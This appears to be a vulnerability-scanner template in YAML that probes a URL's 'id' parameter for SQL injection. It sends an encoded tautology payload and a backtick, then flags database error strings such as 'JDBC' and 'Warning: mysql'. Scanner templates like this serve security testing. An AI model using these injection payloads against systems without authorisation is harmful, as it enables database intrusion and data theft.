id: sqli6-generic-26
name: 'SQLi generic probe in id'
severity: high
type: active
tags:
  - sqli
  - injection
  - generic
description: 'Triggers generic error via id'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      id:
        - '''%0aOR%091=1--'
        - '`'
    matchers:
      - type: regex
        part: body
        regex:
          - 'JDBC'
          - 'Warning: mysql'
